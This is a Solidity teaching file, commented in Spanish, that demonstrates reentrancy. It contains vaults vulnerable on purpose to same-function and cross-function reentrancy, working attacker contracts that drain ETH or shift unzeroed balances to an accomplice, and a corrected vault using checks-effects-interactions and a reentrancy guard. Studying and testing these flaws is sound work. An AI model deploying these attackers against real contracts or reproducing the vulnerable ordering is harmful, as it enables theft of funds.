// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

// ============================================================================
// PARTE 1: reentrancy en la MISMA funcion.
// ============================================================================
//
// `retirar()` envia el ETH ANTES de poner el balance en cero. Mientras dura
// el envio, el destinatario puede volver a llamar `retirar()` y
// `balances[msg.sender]` todavia muestra el monto original: se puede retirar
// muchas veces con un solo deposito.
contract BovedaVulnerable {
    mapping(address => uint256) public balances;

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    // VULNERABLE: interaccion (call) antes de efecto (balances = 0).
    function retirar() external {
        uint256 monto = balances[msg.sender];
        require(monto > 0, "Sin saldo");

        (bool ok, ) = msg.sender.call{value: monto}("");
        require(ok, "Envio fallido");

        balances[msg.sender] = 0; // demasiado tarde: ya se reentro
    }
}

// Ataca BovedaVulnerable retirando una y otra vez con el mismo deposito.
contract AtacanteReentradaSimple {
    BovedaVulnerable public immutable objetivo;
    uint256 private _montoPorRetiro;

    constructor(BovedaVulnerable objetivo_) {
        objetivo = objetivo_;
    }

    // Deposita y dispara el primer retirar(). Los siguientes retiros
    // ocurren dentro de receive(), mientras dura el retirar() original.
    function atacar() external payable {
        _montoPorRetiro = msg.value;
        objetivo.depositar{value: msg.value}();
        objetivo.retirar();
    }

    // Cada vez que la boveda nos envia ETH, reentramos y pedimos otro
    // retiro. Solo lo intentamos si la boveda TODAVIA tiene fondos para
    // esa proxima llamada: si dejamos que una llamada de mas falle, el
    // require() de retirar() revertiria, y ese revert se propagaria hacia
    // atras por TODA la cadena de reentradas (perderiamos el ataque completo,
    // no solo el ultimo paso).
    receive() external payable {
        if (address(objetivo).balance >= _montoPorRetiro) {
            objetivo.retirar();
        }
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ============================================================================
// PARTE 2: reentrancy CRUZADA entre dos funciones distintas.
// ============================================================================
//
// Aqui ninguna funcion, vista por separado, "parece" vulnerable: `retirar()`
// solo se llama a si misma en el ejemplo anterior, pero el problema real es
// que CUALQUIER funcion que lea o escriba el mismo estado (`balances`)
// durante la ventana de la llamada externa puede aprovecharse. `transferirA`
// no envia ETH ni hace llamadas externas, pero comparte `balances` con
// `retirar()`, y eso alcanza para explotarla desde la reentrada.
contract BovedaVulnerableCruzada {
    mapping(address => uint256) public balances;

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE por la misma razon que antes: interaccion antes de efecto.
    function retirar() external {
        uint256 monto = balances[msg.sender];
        require(monto > 0, "Sin saldo");

        (bool ok, ) = msg.sender.call{value: monto}("");
        require(ok, "Envio fallido");

        balances[msg.sender] = 0;
    }

    // Esta funcion, aislada, es correcta: valida el saldo y lo mueve.
    // El problema es CUANDO se la llama: si `balances[msg.sender]` todavia
    // no se puso en cero (porque estamos dentro de un retirar() en curso),
    // se puede mover un saldo que ya deberia estar en cero.
    function transferirA(address to, uint256 monto) external {
        require(balances[msg.sender] >= monto, "Saldo insuficiente");
        balances[msg.sender] -= monto;
        balances[to] += monto;
    }
}

// En vez de retirar de nuevo, reentra por la OTRA funcion y regala el
// saldo (que todavia no se puso en cero) a un complice.
contract AtacanteReentradaCruzada {
    BovedaVulnerableCruzada public immutable objetivo;
    address public immutable complice;

    constructor(BovedaVulnerableCruzada objetivo_, address complice_) {
        objetivo = objetivo_;
        complice = complice_;
    }

    function atacar() external payable {
        objetivo.depositar{value: msg.value}();
        objetivo.retirar();
    }

    receive() external payable {
        // balances[address(this)] en la boveda todavia vale msg.value:
        // retirar() aun no llego a la linea "balances[msg.sender] = 0".
        objetivo.transferirA(complice, msg.value);
    }
}

// ============================================================================
// PARTE 3: version corregida.
// ============================================================================
//
// Dos defensas independientes, aplicadas juntas:
//  1. Checks-Effects-Interactions: el efecto (poner el balance en cero)
//     ocurre ANTES de la interaccion (enviar ETH). Esto alcanza para frenar
//     tanto el ataque de la Parte 1 como el de la Parte 2, porque en el
//     momento de la reentrada `balances[msg.sender]` ya es cero.
//  2. Un guard de reentrada, como red de seguridad adicional.
contract BovedaSegura {
    mapping(address => uint256) public balances;
    bool private _bloqueado;

    error Reentrada();

    modifier noReentrante() {
        if (_bloqueado) revert Reentrada();
        _bloqueado = true;
        _;
        _bloqueado = false;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function retirar() external noReentrante {
        uint256 monto = balances[msg.sender];
        require(monto > 0, "Sin saldo");

        balances[msg.sender] = 0; // efecto primero

        (bool ok, ) = msg.sender.call{value: monto}(""); // interaccion despues
        require(ok, "Envio fallido");
    }

    function transferirA(address to, uint256 monto) external {
        require(balances[msg.sender] >= monto, "Saldo insuficiente");
        balances[msg.sender] -= monto;
        balances[to] += monto;
    }
}

// El mismo atacante de la Parte 1, apuntando a BovedaSegura. Si consigue
// reentrar y retirar mas de una vez, el test de la version segura falla.
contract AtacanteContraBovedaSegura {
    BovedaSegura public immutable objetivo;
    uint256 public vecesQueRetiro;

    constructor(BovedaSegura objetivo_) {
        objetivo = objetivo_;
    }

    function atacar() external payable {
        objetivo.depositar{value: msg.value}();
        objetivo.retirar();
    }

    receive() external payable {
        vecesQueRetiro++;
        // Si la boveda es segura, esta llamada revierte (SinSaldo o Reentrada)
        // y ese revert lo atrapamos para que el ataque no rompa el test.
        try objetivo.retirar() {} catch {}
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
